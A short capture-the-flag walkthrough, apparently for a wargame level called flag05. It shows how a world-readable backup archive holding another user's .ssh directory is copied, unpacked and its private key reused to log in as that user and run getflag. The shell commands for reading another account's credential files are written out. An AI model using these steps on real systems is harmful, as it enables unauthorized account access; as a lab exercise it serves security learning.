Check the flag05 home directory. You are looking for weak directory permissions

After logging in and moving to /home/flag05 directory we can check files and their permissions using ls -la.
There are only two directories .backup and .ssh, but .ssh has permissions set to rwx only for an owner.
.backup directory has r-x permissions set for our group. Inside this directory we can find a .tgz archive but we are not permitted to unpack it.

Because .backup is readable and executable we can copy it to our home folder, where then we can change privileges to archive file.
> cp -r .backup /home/level05
> chmod 777 .backup
> cd .backup
> tar -xvf archive.tgz

Now we have a backup of flag05 .ssh directory, where we can find public and private ssh key, as well as known hosts. 
Using these files we can log in via ssh.
> cp -r .shh ~/
> ssh flag05@localhost
> getflag
You have successfully executed getflag on a target account.
